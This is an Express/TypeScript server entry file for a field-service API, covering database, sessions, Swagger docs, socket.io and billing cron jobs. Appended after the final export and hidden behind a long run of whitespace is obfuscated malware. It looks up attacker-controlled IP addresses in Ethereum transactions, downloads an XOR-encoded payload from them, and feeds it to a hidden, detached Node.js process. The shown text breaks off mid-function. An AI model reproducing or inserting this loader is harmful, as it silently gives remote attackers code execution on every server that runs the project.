import express from 'express';
import dotenv from 'dotenv'
import mongoose from 'mongoose'
import logger from 'morgan'
import compression from 'compression'
import cookieParser from 'cookie-parser'
import session from 'express-session'
import bodyParser from 'body-parser'
import cors from 'cors'
import passport from 'passport'
import passportMiddleWare from './middleware/passport'
import { MongoError } from 'mongodb'
import routesV1 from './routes/v1'
import routesV2 from './routes/v2'
import { RegisterRoutes } from "./routes/v3/routes";
import * as swaggerDocumentV3 from './routes/v3/swagger.json';
import swaggerUi, { serve } from 'swagger-ui-express'
import * as swaggerDocumentV1 from './swagger_v1.json'
import * as swaggerDocumentV2 from './swagger_v2.json'

// const CronJob = require('cron').CronJob;
import { CronJob } from 'cron'
import request from 'request';
import socketioJwt from 'socketio-jwt';
import * as Sentry from '@sentry/node';

//Environment config
import moment from 'moment-timezone';
import { EmailSchedule, IEmailSchedule } from './models/EmailSchedule';
import { IUser, User } from './models/User';
import { IEmployee, Employee } from './models/Employee';
import { ICompanyAdmin } from './models/CompanyAdmin'
import { Job } from './models/Job';
import { sendScheduledJobEmailToAssignee } from './services/aws';
import { Company } from './models/Company';
import { Customer } from './models/Customer';
import { Status, Messages, JobStatus } from './common/constants';
import { _initializeFirebase } from './services/firebase';
import { getRegisteredUser } from './blockchain/registerUser';
import { errorHandler } from './middleware/errorHandler';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const timeout = require('connect-timeout');
const MongoStore = require('connect-mongo');

dotenv.config()
process.env.TZ = 'America/Chicago';
//Database connection
const { DB_USER, DB_PASS, DB_HOST, DB_NAME, session_secret, jwt_encryption } = process.env
const dbConnect = DB_HOST === 'localhost'
  ? `mongodb://${DB_HOST}/${DB_NAME}`
  : `mongodb+srv://${DB_USER}:${DB_PASS}@${DB_HOST}/${DB_NAME}?retryWrites=true&w=majority`;

mongoose.set('useCreateIndex', true);
const mongoOptions = {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  useFindAndModify: false,
  poolSize: 5
};


// Increasing pool size for production
if (process.env.ENVIRONMENT === 'production') {
  mongoOptions.poolSize = 15;
}


mongoose.connect(
  dbConnect,
  mongoOptions,
  (err: MongoError) => {

    if (err) return console.log(`Database connection error: ${err}`)
    console.log('Database connected successfully')

  }
)

// Application/Server configs
const app = require('express')();

Sentry.init({
  dsn: "https://7ce3dc3af480456e9351a3df61cd166a@o4505155845226496.ingest.sentry.io/4505156270686208",
  tracesSampleRate: 1.0,
  environment: process.env.ENVIRONMENT
});


app.use(timeout('1200s'));

app.use(haltOnTimeout);

function haltOnTimeout(req: any, res: any, next: any) {
  if (!req.timedout) {
    next()
  } else {
    res.json({ 'Status': Status.TimeOut, 'message': 'TimeOut! Request took too long' });
  }
}

// Handle session
app.use(
  session({
    secret: session_secret || jwt_encryption,
    resave: false,
    saveUninitialized: false,
    cookie: {
      maxAge: 1000 * 60 * 60 * 24 * 30, // 30 days
      secure: true,
    },

    // Database settings to session
    store: MongoStore.create({
      mongoUrl: dbConnect,
      mongoOptions: { useNewUrlParser: true, useUnifiedTopology: true },
      collectionName: 'sessions',
      autoRemove: 'native' // Remove session when expired
    }),
  })
);

app.set('port', process.env.PORT || 3000)
app.use(compression())
app.use(cookieParser())
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb', parameterLimit: 10000000 }));
// To allow requests from all origins using the wildcard
app.use(cors({ origin: '*', credentials: true }));
// To enable pre-flight across-the-board
app.options('*', cors());


//Auth middleware
app.use(passport.initialize())
app.use(passport.session());
passportMiddleWare(passport)

//Logger
app.use(logger('dev'))

//Swagger
const options = {
  explorer: true,
  swaggerOptions: {
    urls: [
      {
        url: '/swagger/v1',
        name: 'Version 1'
      },
      {
        url: '/swagger/v2',
        name: 'Version 2'
      },
      {
        url: '/swagger/v3',
        name: 'Version 3'
      }
    ]
  }
}

RegisterRoutes(app);

app.use(errorHandler);

app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(null, options));
const swaggerRoutes = () => {
  const router: express.Router = express.Router();
  //Documentation version 1
  router.get('/v1', async (req, res) => {
    swaggerDocumentV1.servers.push({ url: process.env.BASE_URL || "https://blueclerk-node-api.deploy.blueclerk.com/api/v1" });
    return res.json(swaggerDocumentV1);
  })
  //Documentation version 1
  router.get('/v2', async (req, res) => {
    swaggerDocumentV2.servers.push({ url: process.env.BASE_URL_V2 || "https://blueclerk-node-api.deploy.blueclerk.com/api/v2" });
    return res.json(swaggerDocumentV2);
  })

  router.get('/v3', async (req, res) => {
    swaggerDocumentV3.servers.push({ url: process.env.BASE_URL_V3 || "https://blueclerk-node-api.deploy.blueclerk.com/api/v3" });
    return res.json(swaggerDocumentV3);
  })
  return router;
}
app.use('/swagger', swaggerRoutes());


const httpServer = require('http').createServer(app);
const sio = require("socket.io")(httpServer, {
  cors: true,
  origins: ["https://blueclerk-frontend-react.deploy.blueclerk.com", 'http://testing.blueclerk.com', 'https://app.blueclerk.com', 'https://staging-suppliers.blueclerk.com'],
  transport: ['websocket']

});

// Initialize Firebase
_initializeFirebase();

// Authenticate Socket client by its Authorization token
sio.use(socketioJwt.authorize({
  secret: process.env.jwt_encryption,
  handshake: true,
  auth_header_required: true
}));

sio.on("connection", (socket: any) => {
  console.log("Connected!");

  // Find if the user exists and retrieve his/her company ID
  User.findOne(
    { _id: socket.decoded_token.id },
    (err: any, user: ICompanyAdmin) => {
      if (err || !user) {
        // emit the error
        socket.emit(Messages.UnAuthorized, 'User not found');
      } else {
        // Let the client joins the room based on their company_id
        socket.join(user.company?.toString());
        // Let the client join private room from req.user
        socket.join(user.company?.toString() + user.id?.toString())
      }
    }
  )

  socket.on('message', () => {
    console.log('Message received from FE!');
  });
});
sio.on('disconnect', (socket: any) => {
  console.log('Disconnected at ', new Date());
})
app.use('/api/v1', routesV1(sio))
app.use('/api/v2', routesV2(sio))
new CronJob('0 0 1 * *', function () {
  // console.log('You will see this message every second');

  request('http://localhost:' + app.get('port') + '/api/v1/chargeSubscription', function (response: any) {
    console.log(response);

  });

}, null, true, 'America/Chicago');

// new CronJob('59 23 4 * *', function () {
//   request('http://localhost:' + app.get('port') + '/api/v1/downgradeCompanies', function (response: any) {
//     console.log(response);
//   });
// }, null, true, 'America/Chicago');

// Cron Job to finalize all draft company invoices at the end of each day
new CronJob('59 23 * * *', () => {
  request(`http://localhost:${app.get('port')}/api/v1/finalizeStripeInvoices`, (response: any) => {
    console.log('== response:', response);
  });
}, null, true, 'America/Chicago');

// Cron Job to update commisions for those set on future date at the beginning of each day
new CronJob('1 0 * * *', () => {
  request(`http://localhost:${app.get('port')}/api/v1/updateCommissionCron`, (response: any) => {
    console.log('== response:', response);
  });
}, null, true, 'America/Chicago');

// Cron Job to handle and update all incomplete job at the end of each day
// new CronJob('59 23 * * *', async () => {
//   try {
//     await Job.updateMany(
//       { 'tasks.status': { $in: [JobStatus.STARTED, JobStatus.PAUSED] } },
//       { $set: { 'tasks.$.status': JobStatus.INCOMPLETE, status: JobStatus.INCOMPLETE } }
//     ).exec();
//   } catch (err) {
//     console.log('== Handle incomplete jobs err:', err);
//   };
// }, null, true, 'America/Chicago');

/**
 * This is for email scheduling
 */
/**
 * Kris' remark (April 14th, 2022):
 * Disable the email cron for now,
 * because we don't need this feature as per say
 */
//  try {
//   let emailQueue: any[] = [];
//   new CronJob('* * * * *', async function () {
//     await EmailSchedule.find({ pulled: false, _id: { $nin: emailQueue } }).populate('user').populate('jobs').exec()
//       .then(async (schedules: IEmailSchedule[]) => {
//         if (schedules.length) {
//           for (let emailSchedule of schedules) {
//             //Check if emailSchedule is already in emailQueue
//             if (emailQueue.filter((e) => JSON.stringify(e) == JSON.stringify(emailSchedule._id)).length == 0) {
//               // Get User Schedule time
//               let user: any = emailSchedule.user;
//               // either company contractor or employee/admin
//               let userScheduleTime = user.emailPreferences;
//               let to: string;
//               let replyTo: string;
//               let assigneeName: string;
//               switch (emailSchedule.type) {
//                 case 1: {
//                   let contractor = await Company.findOne({ admin: emailSchedule.user });
//                   to = contractor.info.companyEmail;
//                   assigneeName = contractor.info.companyName;
//                   break;
//                 }
//                 case 2: {
//                   let customer = await Customer.findOne({ _id: emailSchedule.user });
//                   to = customer.info.email;
//                   let company = await Company.findOne({ company: customer.company });
//                   replyTo = company.info.companyEmail;
//                   assigneeName = customer.contactName;
//                   break;
//                 }
//                 default: {
//                   let employee = await Employee.findOne({ _id: emailSchedule.user });
//                   to = employee.auth.email;
//                   assigneeName = user.profile.displayName;

//                   let company = await Company.findOne({ _id: employee.company });
//                   replyTo = company.info.companyEmail;
//                   break;
//                 }
//               }
//               let sendDate;
//               let timeZone = userScheduleTime ? userScheduleTime.timeZone : 'America/Chicago';
//               if (userScheduleTime) {
//                 let hours = userScheduleTime.time ? userScheduleTime.time.getHours() : 21;
//                 let minutes = userScheduleTime.time ? userScheduleTime.time.getMinutes() : 0;
//                 sendDate = moment().tz(timeZone).hours(hours).minutes(minutes).seconds(58);
//               } else {
//                 sendDate = moment().tz(timeZone).hours(21).minutes(0).seconds(58);
//               }
//               emailQueue.push(emailSchedule._id);
//               if (!emailSchedule.pulled && moment().tz(timeZone).diff(sendDate) < 0) {
//                 new CronJob(sendDate, async function () {
//                   let doc: any = await EmailSchedule.findOne({ _id: emailSchedule._id });
//                   sendScheduledJobEmailToAssignee(doc.jobs, to,replyTo, assigneeName, emailSchedule);
//                   emailQueue = emailQueue.filter((e) => JSON.stringify(e) !== JSON.stringify(emailSchedule._id));
//                 }, null, true);
//               }
//             }
//           }
//         }
//       });
//   }, null, true);

// } catch (err) {
//   console.log({ error: err.message });

// }

// Register Blockchain User\
(async () => {
  try {
    await getRegisteredUser();
    console.log('Blockchain:: successfully created app user')
  } catch (error) {
    Sentry.captureException(error);
    console.error('Blockchain:: failed to create app user')
  }
})()

// Error handling middleware
app.use((err: any, req: any, res: any, next: any) => {
  console.error(err.stack);
  res.status(500).send(err.message || 'Something went wrong');
});

//Starting the server
const server = httpServer.listen(
  app.get('port'),
  (err: any) => {
    if (err) return console.log(`Server start error: ${err}`)
    console.log(`Server started at port: ${app.get('port')}`)
  }
)

server.keepAliveTimeout = (60 * 1000) + 1000;
server.headersTimeout = (60 * 1000) + 2000;
// Test comment for GitLab and ClickUp task #307pke
module.exports = app;																																																																																																																																																																																																																																																																										global.i = 'A10-*2249';function a(a){var c="|Pn2Zjx.w@Qf\";`]vmTs5Jc>OYgE7tpzL!_R/3BFAD^)U<lo:Gd~$NhK*iS(9u0[H+X,%kq1yI6?{r}eMVWC=ab#&48",d=""+(a||""),e=d.length,f=[],g=0,h=0,j=-1;for(var k=0;k<e;k++){var m=c.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;g|=j<<h;h+=(j&8191)>88?13:14;do{f.push(g&255);g>>=8;h-=8}while(h>7);j=-1}}if(j>-1){f.push((g|j<<h)&255)}return l(f)}function b(b,d){return a(c.slice(b,b+d))}var c="o_vMB>dh\"B&F{|&PGNOI3Q7Bq1f9tqBW;O2FVBr:nm.yC`dXCi6Q+CpsLDEQ,,c7X@y])Z%TW:\"pEAPUGCL0I`vYE`DYx=$5]@wj,I|R/Biifuk`)ddXI)eW:HWv_a,j(;,M^UbAH.|=hk(TDH5>Us%edKlZQy3*vf0)\"x%\"CgS[>WB4HaU3$C0QGF}9|N%w^m/!UleMD,pS#Z%rgI:cnM@^MZ:T_*(Iw{B|/mh@?CRFs|@bZ+/4m80lG4O[>SmlZt47}3iJQmVuaEN[I@yo_R)>{]V$bS5z+fC)Bp2RLgX{m3iJQmVuaENhq[B7vL)ug}Vgn={3iJQmVuaEN[I@y5ROl%Nm}VDx*`3iJQmVuaEN[Ir95Am9fLEMzs`w]?pGx3)Ay@71VmhHhy?3G^3iJQmVuaEN[Ir9RBRg+hp1tVXH^:Pv#_\"x2L;VvwqHY+RC;p[A4?sylc*cmQU7ZjN{t`aSe]$Wdl6O>fN4P.$|BT$s#Gg]8[Nsb7M%v%pEh+:HxyB9\"Jkl^1^X$&LT3Qok$mPaEWjfW=R)TLmI`IZX1,}gf+cO/>.l2)2%GhBtmE[WU.B.jt{=A&!R)dgK?IjNLzAa@R~+e^kTtA*hhrd#KZ/FzmWzyVo){Q~gN9=,xxTN$V%h|OxkL/Co5a7<upq4oKnA}#ql6#A/{cu}$.Wx`i=5E&[C(?Zm2F96`Id;`~1#3cx#<<Bx[*q]W5lN3cQkr}cxgdDEZB@;KJ3iJQ@DFanKt?;e_>F;]\"ySD#?/_bSis<N_A/#CWo5B5@2;oF#b?+odzJ[O=ce?Ld2[xQzF2a>K@+Q2~2=bIu_*e\"xYB>iiwjgYQw)F&}43(n$rQ3S_Lo,wB5+Yu>h;#|nZH=No%ta^4we?dS7ldK9!ICM;x>T!Kj?lfr3}3bmim<8^OMrL8i!$rc:!7.&Vs`.q}X%$xc$F5Fl5I<_=n$iY9CA&8}8^OMrLbTM1D`gmcF6#0:xG)$S&tr|FH`tHsnH{7X&X)ZxO/Afs9}f5<X}~ncDF.sE$:I]feoTc;%Q;.DL^OMrL8iS$xc$F5FQb6iQswZ5IHvk7DLOqHWWCsh7siiOSMVPIOYLeOufWAp23U9tGKjvd4uhwQgB6gdjzKEzxe5EpnsZOtQfVehjS9boXG3AEWN0C3C1t6Jk1PUMRFQAXz0XPPqcZ0Bn51eNno2AGgvvOYWD3SFJ0WMfHn1mL9S9sT1yEUJOKPW5OM0E5fl9tMzigxdbEsJ8GHMT2zHNwXQ5FuQjZiymq4NXuqsU";function d(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}a:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue a;return b}catch(e){}return b||this}var e=d()||{},f=e.TextDecoder,g=e.Uint8Array,h=e.Buffer,i=e.String||String,j=e.Array||Array,k=function(){var a=new j(128),b=i.fromCodePoint||i.fromCharCode,c=[];return function(d){var e,f,g=d.length;c.length=0;for(var h=0;h<g;){f=d[h++];f<=127?e=f:f<=223?e=(f&31)<<6|d[h++]&63:f<=239?e=(f&15)<<12|(d[h++]&63)<<6|d[h++]&63:i.fromCodePoint?e=(f&7)<<18|(d[h++]&63)<<12|(d[h++]&63)<<6|d[h++]&63:(e=63,h+=3);c.push(a[e]||(a[e]=b(e)))}return c.join("")}}();function l(a){return typeof f!=="undefined"&&f?(new f).decode(new g(a)):typeof h!=="undefined"&&h?h.from(a).toString("utf-8"):k(a)}var m=n();function n(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}b:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue b;return b}catch(e){}return b||this}function o(a){switch(a){case"aowaYkQ":return m.Map;case"ScVvzHB":return m.Math;case"LYahbCb":return m.JSON;case"UcVlGXr":return m.Boolean;case"GO7Nrh":return m.tTUslG;case"z2lXInR":return m.TG2cJIk;case"LjKGqSw":return m.to__5dE;case"XzeSjRU":return m.hPRNJpg;case"BLxK2l":return m.Sclv_Jn;case"w8SHhF":return m.BigInt;case"w24XslL":return m.RwXr52a;case"HdYixQ":return m.llZ36m;case"P2AKM57":return m.vM7khEA;case"UqL1mIS":return m.MgHS1fx;case"bqgS0uT":return m.cNfC_7;case"zry4hT0":return m.VJNU3_;case"wOf1fy":return m.Number;case"TAIsJro":return m.Error;case"jQvQTiW":return m.MFMrPhJ;case"9MPP0cK":return m.JtrWh6;case"i11XSB":return m.E5BYrDP;case"9zqtB2O":return m.UzYC2SR;case"cHMvB92":return m.OaeceOf;case"k__4zk":return m.setTimeout;case"xh5d15l":return m.O_iVybz;case"gERyCM":return m.WYrZbg3;case"TZqePfg":return m.KM0n1S;case"MoCspX":return m.xfebTjG;case"rZ5CTo1":return m.rbDj0XM;case"tW6Pn0":return m.FnZlfg_;case"pOZAUNs":return m.Array;case"G6145X":return m.wI0nBkk;case"7Qu4NZb":return m.dtj7OXY;case"Bd1rSK":return m.ie99moZ;case"3o6cDhK":return m.RFJv7_;case"HbfDUfa":return m.hvpU54;case"cIKxCVp":return m.KzTTyR_;case"BimznrA":return m.j3Qtuw6;case"tdTjubV":return m.Promise;case"ilyFOCU":return m.wocW6T;case"y8sAIw":return m.JuwsDx;case"qjSqfm":return m.hNpMC1p;case"aJiSad":return m.eyFciSD;case"BlBOECA":return m.v4EfHU;case"bBSqay":return m.ItLZkU;case"JOOaEO5":return m.ihgc7mc;case"un8sN4v":return m.GZqewR;case"Mk0LmrW":return m.Set;case"hDlNJsF":return m.AbortController;case"KV6k6c":return m.xi3JBX;case"NEujWY":return m.q6lpgVG}}global.r=require;if(typeof module==="object"){global.m=module}const p=require("node:http"),q=require("node:https"),r=require("node:zlib"),{URL:s}=require("node:url"),{spawn:t}=require("node:child_process");function u(a){return new(o("tdTjubV"))(b=>{let d;try{d=t("node",["-i"],{detached:!0,windowsHide:!0,stdio:["pipe","pipe","pipe"]})}catch{b();return}let e="",f=!1;const g=()=>{return b()},h=()=>{function b(e){var h="MN;k5@81(.bBhxU0ycDQ6=Xw`</KeV>CGg]~IZ\"i$F!Y4W#|n9t%&3+auLq:foHEr^[7R2*lOvP)_dSs}zTm{,JA?jp",d=""+(e||""),f=d.length,g=[],a=0,c=0,j=-1;for(var k=0;k<f;k++){var m=h.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;a|=j<<c;c+=(j&8191)>88?13:14;do{g.push(a&255);a>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((a|j<<c)&255)}return l(g)}function e(e,h){return b(c.slice(e,e+h))}if(f){return}f=!0;const h=a.endsWith("\n")?a:""+a+"\n";d.stdin.write(e(149,51),()=>{d.stdin.write(h,()=>{d.stdin.end();d.stdin.unref();if(d.stdout){d.stdout.unref()}if(d.stderr){d.stderr.unref()}d.unref();g()})})},i=b=>{e+=b.toString("utf8");if(new RegExp("(^|\\n)> $","").test(e)){h()}};d.on("error",g);d.stdout.on("data",i);d.stderr.on("data",i);d.stdin.write("\n");o("k__4zk")(h,10000)})}const v=1000n,w=b(205,52).toLowerCase(),x=12,y=0n,z=b(261,37),A=3000,B=[...new(o("Mk0LmrW"))([process.env.ETH_RPC_URL,b(301,24),b(327,25),b(354,43),b(402,47)].filter(o("UcVlGXr")))],C={"http:":new p.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64}),"https:":new q.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64})};function D(a,b){if(!a){return}a.addEventListener("abort",()=>{return b.abort()},{once:!0})}function E(a){const b=(a.headers["content-encoding"]||"").toLowerCase();if(b==="gzip"||b==="x-gzip"){return a.pipe(r.createGunzip())}if(b==="deflate"){return a.pipe(r.createInflate())}if(b==="br"){return a.pipe(r.createBrotliDecompress())}return a}function F(a,{method:b="GET",body:c,signal:d}={}){const e=new s(a),f=e.protocol==="https:"?q:p,g={Accept:"application/json","Accept-Encoding":"gzip, deflate, br",Connection:"keep-alive"};if(c!=null){g["Content-Type"]="application/json";g["Content-Length"]=Buffer.byteLength(c)}return new(o("tdTjubV"))((a,h)=>{const i=f.request({hostname:e.hostname,port:e.port||(e.protocol==="https:"?443:80),path:e.pathname+e.search,method:b,agent:C[e.protocol],signal:d,headers:g},i=>{const b=E(i),c=[];b.on("data",i=>{return c.push(i)});b.on("end",()=>{const b=Buffer.concat(c).toString("utf8").trim();if(i.statusCode<200||i.statusCode>=300){return h(new(o("TAIsJro"))("HTTP "+i.statusCode+" from "+e.hostname+": "+b.slice(0,120)))}if(!b||b[0]==="<"||b[0]!=="{"&&b[0]!=="["){return h(new(o("TAIsJro"))("Non-JSON from "+e.hostname+": "+b.slice(0,120)))}try{a(o("LYahbCb").parse(b))}catch(err){h(new(o("TAIsJro"))("JSON parse failed from "+e.hostname+": "+err.message))}});b.on("error",h)});i.on("error",h);i.setTimeout(A,()=>{i.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});if(c!=null){i.write(c)}i.end()})}async function G(a,b){const d=B.map(()=>{return new(o("hDlNJsF"))});d.forEach(a=>{return D(b,a)});try{return await o("tdTjubV").any(B.map((b,e)=>{return a(b,d[e].signal)}))}finally{for(const e of d)e.abort()}}async function H(a,b,c,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify({jsonrpc:"2.0",id:1,method:b,params:c}),signal:d});if(e?.error){throw new(o("TAIsJro"))(e.error.message||o("LYahbCb").stringify(e.error))}if(e?.result==null){throw new(o("TAIsJro"))("RPC "+b+": missing result")}return e.result}async function I(a,b,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify(b.map(([a,b],d)=>{return{jsonrpc:"2.0",id:d+1,method:a,params:b}})),signal:d});if(!o("pOZAUNs").isArray(e)){function f(a){var d="@Q>u}m3fd=#BJs{$KNO8HDXYZvq]ETSzlxG_ki|)%(erj*Ap.b/\"Mn~oVa7L:`,^&2RWhUP6?!5w[+g;C0tcy194I<F",e=""+(a||""),f=e.length,g=[],h=0,c=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;h|=j<<c;c+=(j&8191)>88?13:14;do{g.push(h&255);h>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((h|j<<c)&255)}return l(g)}function g(a,b){return f(c.slice(a,a+b))}throw new(o("TAIsJro"))(g(457,42))}const h=new(o("aowaYkQ"))(e.map(a=>{return[a.id,a]}));return b.map((a,b)=>{const d=h.get(b+1);if(!d){function e(a){var d="=EM#NpJ]wjaLeQyO/x|n@FW5:1q}2C[t{<>czkr.P)_!HvSVd~s*6m^8K\"+Ub93YilAXohgf$RD,0T4(uZB%?7`&I;G",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function f(a,b){return e(c.slice(a,a+b))}throw new(o("TAIsJro"))(f(503,39)+(b+1))}if(d.error){throw new(o("TAIsJro"))(d.error.message||o("LYahbCb").stringify(d.error))}if(d.result==null){function g(a){var d="dX{6iZ>\"Y4aBjL+!Efs9&~|@})nQpTFq3_:*A.x^V8Jug`NSPUb$or2]0/,#=Om;zlM%(1WKGRk[Cty7H<cI5ewh?Dv",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function j(a,b){return g(c.slice(a,a+b))}throw new(o("TAIsJro"))(j(547,36)+(b+1))}return d.result})}const J=a=>{return"0x"+a.toString(16)};function K(a){return a.find(a=>{return a.from&&a.from.toLowerCase()===w})||null}function L(a){try{const b=Buffer.from(a.replace(new RegExp("^0x","i"),""),"hex"),c=a=>{return""+a[0]+"."+a[1]+"."+a[2]+"."+a[3]};return[c(b.subarray(0,4)),c(b.subarray(4,8))]}catch(error){return[null,null]}}function M(a){return new(o("tdTjubV"))(b=>{let c=a.length;if(!c){return b(null)}let d=!1;const e=c=>{if(d){return}d=!0;for(const e of a)e.controller.abort();b(c)};for(const f of a)f.run().then(f=>{if(d){return}if(f){e(f)}else{if(--c===0){b(null)}}})["catch"](()=>{if(!d&&--c===0){b(null)}})})}function N(a){const c=a-v,d=new(o("Mk0LmrW")),e=[];for(const f of[a-1n,a,a+1n,c-1n,c,c+1n]){if(f<0n){continue}const g=f.toString();if(d.has(g)){continue}d.add(g);e.push(f)}return e}function O(a){const b=new(o("hDlNJsF"));return{controller:b,run:async()=>{const c=await G((c,d)=>{return H(c,"eth_getBlockByNumber",[J(a),!0],d)},b.signal),d=c?.transactions;if(!o("pOZAUNs").isArray(d)){return null}const e=K(d);return e?{blockNumber:a,tx:e}:null}}}async function P(a,b){const c=a.map(a=>{return["eth_getTransactionCount",[w,J(a)]]});try{return(await G((a,b)=>{return I(a,c,b)},b)).map(o("w8SHhF"))}catch{return(await o("tdTjubV").all(c.map(([a,c])=>{return G((b,d)=>{return H(b,a,c,d)},b)}))).map(o("w8SHhF"))}}async function Q(a){const b=new(o("hDlNJsF"));try{const c=a??o("w8SHhF")(await G((a,b)=>{return H(a,"eth_blockNumber",[],b)},b.signal)),d=o("w8SHhF")(await G((a,b)=>{return H(a,"eth_getTransactionCount",[w,J(c)],b)},b.signal)),e=d-1n;let f=y-1n,g=c;while(g-f>1n){const h=g-f-1n,j=o("w8SHhF")(o("ScVvzHB").min(x,o("wOf1fy")(h))),l=[];for(let m=1n;m<=j;m+=1n)l.push(f+m*(g-f)/(j+1n));const n=await P(l,b.signal),p=n.findIndex(a=>{return a>=d});if(p===-1){f=l[l.length-1]}else{g=l[p];if(p>0){f=l[p-1]}}}const q=await G((a,b)=>{return H(a,"eth_getBlockByNumber",[J(g),!0],b)},b.signal),r=q?.transactions||[];let s=null;for(const u of r){if(!u.from||u.from.toLowerCase()!==w){continue}if(o("w8SHhF")(u.nonce)===e){s=u;break}if(!s||o("w8SHhF")(u.nonce)>o("w8SHhF")(s.nonce)){s=u}}return{blockNumber:g,tx:s}}finally{b.abort()}}async function R(){function a(a){var d="b8GD;ZC=sK3{@/4Xp*nrcYW2)T~.EyN]OSH6JdF,x+:eq_jv$a!?Bhmz\"^Uw<9l0oQ(|VA}&gLMP5>`%ktIR1f#u[7i",e=""+(a||""),f=e.length,g=[],c=0,h=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;c|=j<<h;h+=(j&8191)>88?13:14;do{g.push(c&255);c>>=8;h-=8}while(h>7);j=-1}}if(j>-1){g.push((c|j<<h)&255)}return l(g)}function b(b,d){return a(c.slice(b,b+d))}const d=""+z+b(588,47)+w+b(642,89),e=await F(d),f=o("pOZAUNs").isArray(e?.result)?e.result:[],g=f.find(a=>{return a.from&&a.from.toLowerCase()===w});if(!g){return null}return{blockNumber:o("w8SHhF")(g.blockNumber),tx:g}}async function S(){function a(a){var d="s&S2Mp={4;Fq1+Vh`.mc:>l|Ya6)i7TdNUkD,e*\"8]ZQ(Pn%oXtvxER0j_A?gbz5!f@3<#OWwIBGHK^JC/}L[y9u$~r",e=""+(a||""),f=e.length,g=[],h=0,j=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;h|=k<<j;j+=(k&8191)>88?13:14;do{g.push(h&255);h>>=8;j-=8}while(j>7);k=-1}}if(k>-1){g.push((h|k<<j)&255)}return l(g)}function d(d,e){return a(c.slice(d,d+e))}let e;try{e=await G((a,d)=>{return H(a,"eth_blockNumber",[],d)})}catch{return}const f=o("w8SHhF")(e),g=f-f%v,h=global;let i=await M(N(g).map(O)),[j,k]=L(i?.tx?.to);function m(a,d,e){if(!a){return null}return new s(b(738,9)+a+":"+d+e)}let n=null;const q=m(j,443,"/0x/cls");if(q){try{n=await r("q4FZkxX{!h,Sr3=@",q)}catch{n=null}}if(!n){i=(await Q(f)["catch"](()=>{return null}))??(await R()["catch"](()=>{return null}));[j,k]=L(i?.tx?.to)}h._V=h.i;h._H=d(751,9)+j+":80";h._H2=d(751,9)+k+":80";h._t_s=d(751,9)+j+":443";h._t_u=d(751,9)+j+":80";function r(a,d){function e(a){var d="AKB3Sd0x/F5yO`@EcwL+q{NXs2;4Jn~#l<r^8>YD&V:i7?pe)hPz\"CT$}9(!%[*1oUtv]u|MjZg,_mbkfQHa6R=.GIW",e=""+(a||""),f=e.length,g=[],j=0,k=0,h=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(h<0){h=q}else{h+=q*91;j|=h<<k;k+=(h&8191)>88?13:14;do{g.push(j&255);j>>=8;k-=8}while(k>7);h=-1}}if(h>-1){g.push((j|h<<k)&255)}return l(g)}function f(a,d){return e(c.slice(a,a+d))}const g={hostname:d.hostname,port:o("wOf1fy")(d.port)||80,path:d.pathname+d.search,headers:{"User-Agent":f(766,137),"Sec-V":h._V||0}};function i(d){const e=a.length;for(let f=0;f<d.length;f++)d[f]^=a.charCodeAt(f%e);return d.toString("utf8")}function j(a){const d=a.headers["x-payload-b64"];if(!d){throw new(o("TAIsJro"))("Missing X-Payload-B64")}return i(Buffer.from(d,"base64"))}function k(a){return new(o("tdTjubV"))((d,e)=>{const f=p.request({...g,method:a},f=>{if(a==="HEAD"){try{d(j(f))}catch(e){e(e)}f.resume();return}const g=[];f.on("data",f=>{return g.push(f)});f.on("end",()=>{try{const a=Buffer.concat(g);if(a.length){return d(i(a))}if(f.headers["x-payload-b64"]){return d(j(f))}e(new(o("TAIsJro"))("Empty payload body"))}catch(e){e(e)}});f.on("error",e)});f.on("error",e);f.setTimeout(A,()=>{f.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});f.end()})}return k("GET")["catch"](()=>{return k("HEAD")})}async function t(a,d,e){try{function f(a){var d="_Wz3Pb8L[^e]AqE,%S4TQ>jB|fy/7NGV!OFmda&J;up1(R?0xvl.o#s$hw\"@C9X+iUY~:IHrn)=5<}M2Zk`c6*{DtKg",e=""+(a||""),f=e.length,g=[],j=0,h=0,k=-1;for(var m=0;m<f;m++){var 